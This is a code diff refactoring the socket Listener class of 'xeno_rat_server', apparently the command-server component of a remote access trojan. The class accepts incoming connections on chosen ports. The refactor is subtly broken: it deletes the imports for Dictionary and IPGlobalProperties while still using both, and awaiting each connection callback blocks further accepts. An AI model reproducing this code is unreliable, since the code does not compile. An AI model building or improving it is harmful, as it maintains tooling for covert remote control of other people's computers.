@@ -1,36 +1,26 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Net.NetworkInformation;
+using System.Linq;
 
 namespace xeno_rat_server
 {
     class Listener
     {
-        public Dictionary<int, _listener> listeners = new Dictionary<int, _listener>();
-        private Func<Socket, Task> ConnectCallBack;
+        private readonly Dictionary<int, _listener> listeners = new Dictionary<int, _listener>();
+        private readonly Func<Socket, Task> ConnectCallBack;
 
-        public Listener(Func<Socket, Task> _ConnectCallBack)
+        public Listener(Func<Socket, Task> connectCallBack)
         {
-            ConnectCallBack = _ConnectCallBack;
+            ConnectCallBack = connectCallBack ?? throw new ArgumentNullException(nameof(connectCallBack));
         }
 
         public bool PortInUse(int port)
         {
             IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
-            IPEndPoint[] ipEndPoints = ipProperties.GetActiveTcpListeners();
-            foreach (IPEndPoint endPoint in ipEndPoints)
-            {
-                if (endPoint.Port == port)
-                {
-                    return true;
-                }
-            }
-            return false;
+            return ipProperties.GetActiveTcpListeners().Any(endPoint => endPoint.Port == port);
         }
 
         public void CreateListener(int port)
@@ -38,37 +28,39 @@ namespace xeno_rat_server
             if (PortInUse(port))
             {
                 MessageBox.Show("That port is currently in use!");
-            }
-            else
-            {
-                if (!listeners.ContainsKey(port))
-                {
-                    listeners[port] = new _listener(port);
-                }
-                try
-                {
-                    listeners[port].StartListening(ConnectCallBack);
-                }
-                catch
-                {
-                    listeners[port].StopListening();
-                    MessageBox.Show("There was an error using this port!");
-                }
+                return;
             }
 
+            if (!listeners.ContainsKey(port))
+            {
+                listeners[port] = new _listener(port);
+            }
+
+            try
+            {
+                listeners[port].StartListening(ConnectCallBack);
+            }
+            catch
+            {
+                listeners[port].StopListening();
+                MessageBox.Show("There was an error using this port!");
+            }
         }
 
         public void StopListener(int port)
         {
-            listeners[port].StopListening();
+            if (listeners.TryGetValue(port, out var listener))
+            {
+                listener.StopListening();
+            }
         }
     }
 
     class _listener
     {
         private Socket listener;
-        private int port;
-        public bool listening=false;
+        private readonly int port;
+        private bool listening = false;
 
         public _listener(int _port)
         {
@@ -84,12 +76,13 @@ namespace xeno_rat_server
             listener.Bind(localEndPoint);
             listener.Listen(100);
             listening = true;
-            while (true)
+
+            while (listening)
             {
                 try
                 {
                     Socket handler = await listener.AcceptAsync();
-                    connectCallBack(handler);
+                    await connectCallBack(handler);
                 }
                 catch (ObjectDisposedException)
                 {
@@ -104,10 +97,10 @@ namespace xeno_rat_server
 
         public void StopListening()
         {
-            listening= false;
-            try { listener.Shutdown(SocketShutdown.Both); } catch { }
-            try { listener.Close(); } catch { }
-            try { listener.Dispose(); } catch { }
+            listening = false;
+            try { listener?.Shutdown(SocketShutdown.Both); } catch { }
+            try { listener?.Close(); } catch { }
+            try { listener?.Dispose(); } catch { }
         }
     }
 }
